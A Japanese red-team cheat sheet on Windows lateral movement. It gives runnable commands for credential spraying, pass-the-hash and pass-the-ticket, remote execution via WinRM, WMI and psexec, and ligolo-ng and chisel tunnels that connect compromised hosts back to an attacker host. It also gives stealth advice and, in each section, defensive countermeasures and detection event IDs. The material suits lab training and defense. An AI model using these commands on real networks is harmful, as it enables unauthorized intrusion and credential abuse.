参Lateral Movement

一台の掌握を面へ広げる。認証情報の再利用、リモート実行、そして到達不能なセグメントへのトンネリング。すべてラボ想定・プレースホルダ。 前提: あるホストで管理者権限、または再利用可能な資格情報/ハッシュを保持。

01認証情報の再利用reuse

横展開の燃料は使い回された資格情報。平文・NT ハッシュ・Kerberos チケットのいずれで動くかを整理する。

スプレー(まず面を測る)

bash
# 1組の資格情報がどのホストで管理者か
nxc smb <TARGETS> -u '<USER>' -p '<PASS>'
# (Pwn3d! 表示 = ローカル管理者)

Pass-the-Hash

bash
# NT ハッシュでそのまま認証
nxc smb <TARGET> -u '<USER>' -H '<NTHASH>'
psexec.py -hashes :<NTHASH> \
  <DOMAIN>/'<USER>'@<TARGET>

Pass-the-Ticket

bash
# ccache を環境変数に設定して Kerberos で認証
export KRB5CCNAME=<TICKET>.ccache
psexec.py -k -no-pass <TARGET.FQDN>
防御 / countermeasures
  • ローカル管理者パスワードを LAPS で個別化し、PtH の横展開連鎖を断つ。
  • Protected Users / Credential Guard でメモリ上の資格情報露出を抑制。
  • 同一アカウントの短時間・多ホストログオン(4624 type 3/9)を相関検知。

02リモート実行remote exec

実行チャネルは検知プロファイルが異なる。SMB サービス生成は目立ち、WinRM は正規運用に紛れやすい。到達性と静粛性で選ぶ。

手段ポート特徴
WinRM5985/5986正規運用に紛れやすい・対話向き
WMI135 + 動的サービス生成なし・比較的静か
SMB (psexec 系)445サービス生成で目立つ・確実
bash
# WinRM 対話（ハッシュ可）
evil-winrm -i <TARGET> -u '<USER>' -H '<NTHASH>'

# WMI 実行（サービス生成なし）
wmiexec.py <DOMAIN>/'<USER>':'<PASS>'@<TARGET>

# 一斉コマンド実行
nxc winrm <TARGETS> -u '<USER>' -p '<PASS>' -x 'whoami'
防御 / countermeasures
  • 管理チャネル(WinRM/WMI)を管理ホストからの JIT 接続に限定。
  • 7045(サービスインストール)、4688(疑わしい親子: services.exe→cmd 等)を監視。
  • 横方向の 445/5985 を微細セグメント化で制限。

03トンネリング到達性を作る

掌握ホストを踏み台に、直接届かない内部セグメントへ経路を通す。代表的な選択肢は ligolo-ng と chisel。

ligolo-ng(推奨・TUN ベース)

bash
# 攻撃側: proxy 起動 + インタフェース準備
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
# ligolo> session → 内部サブネットを追加 → route
sudo ip route add <INTERNAL_SUBNET> dev ligolo
bash
# 掌握ホスト側で agent を実行
./agent -connect $LHOST:11601 -ignore-cert

chisel(HTTP 上の TCP トンネル)

bash
# 攻撃側 server / 掌握側 client（reverse socks）
./chisel server -p 8080 --reverse
./chisel client $LHOST:8080 R:socks
tipsLHOST(tun0)は接続毎に変わる: ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1
防御 / countermeasures
  • egress を許可プロキシ経由に限定し、長時間持続する外向き TCP/TLS を異常として検知。
  • サーバ資産からの想定外の外向き接続(特に高ポート・自己署名 TLS)を監視。

04ピボット設計順序と静粛性

  • 測ってから動く — スプレーで管理者範囲を把握し、最短で価値ある資産へ。
  • 静粛性の順 — WMI/WinRM → 必要時のみ SMB サービス系。痕跡の重いものは後段に。
  • 経路は最小限 — 不要なトンネルを張らない。多層トンネルは遅延と検知面を増やす。
要点 / key takeaways
  • 横展開の起点は再利用資格情報。LAPS と Credential Guard がそのまま最大の対策になる。
  • 実行チャネルは検知プロファイルで選ぶ。確実さ(SMB)と静粛さ(WMI/WinRM)はトレードオフ。
  • ピボットは「到達性の生成」。egress 監視が防御側の要で、TUN より HTTP トンネルの方が紛れやすい。
